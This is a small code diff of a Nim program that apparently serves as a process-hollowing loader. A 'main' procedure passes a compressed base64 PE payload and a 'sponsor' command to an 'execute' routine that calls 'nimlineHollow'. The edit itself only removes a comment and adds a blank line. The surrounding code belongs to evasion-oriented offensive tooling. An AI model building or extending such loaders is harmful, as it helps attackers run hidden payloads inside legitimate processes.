@@ -33,13 +33,13 @@ proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), 
         return nimlineHollow(peStr, cast[LPCSTR](unsafeAddr sponsorCmd[0]))
 
 
-# Execute
 proc main*() =
     discard execute(
         compressedBase64PE = compressedBase64PE, 
         sponsorCmd = sponsorPath & sponsorParams,
         sleepSeconds = sleepSeconds
     )
+
 
 when isMainModule:
     main()
